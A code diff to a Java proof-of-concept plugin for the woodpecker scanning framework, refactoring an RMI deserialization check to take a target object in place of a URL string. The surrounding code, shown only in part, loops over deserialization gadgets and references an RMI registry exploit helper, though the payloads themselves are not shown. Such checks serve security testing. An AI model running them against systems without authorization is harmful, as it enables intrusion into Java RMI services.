@@ -1,9 +1,6 @@
 package me.gv7.woodpecker.plugin.poc;
 
-import me.gv7.woodpecker.plugin.IArgs;
-import me.gv7.woodpecker.plugin.IPoc;
-import me.gv7.woodpecker.plugin.IScanResult;
-import me.gv7.woodpecker.plugin.JavaRMIVulPlugin;
+import me.gv7.woodpecker.plugin.*;
 import me.gv7.woodpecker.plugin.utils.CommonUtil;
 import me.gv7.woodpecker.plugin.utils.RMIRegistryExploit;
 import sun.misc.BASE64Encoder;
@@ -19,13 +16,12 @@ public class RmiDeserialPoc implements IPoc {
     }
 
     @Override
-    public IScanResult doCheck(String targetURL, Map<String, String> customArgs) {
-        Map<String,Object> k = CommonUtil.parseURL(targetURL);
-        String host = (String)k.get("host");
-        int port = Integer.valueOf((String)k.get("port"));
+    public IScanResult doCheck(ITarget target, Map<String, String> map) {
+        String host = target.getHost();
+        int port = target.getPort();
 
         IScanResult scanResult = JavaRMIVulPlugin.pluginHelper.createScanResult();
-        scanResult.setTarget(targetURL);
+        scanResult.setTarget(target.getAddress());
         String msg = "";
         for(String gadget:gadgets){
             String bcelStr = CommonUtil.getVerifyCode("x");
@@ -52,4 +48,5 @@ public class RmiDeserialPoc implements IPoc {
         }
         return scanResult;
     }
+
 }
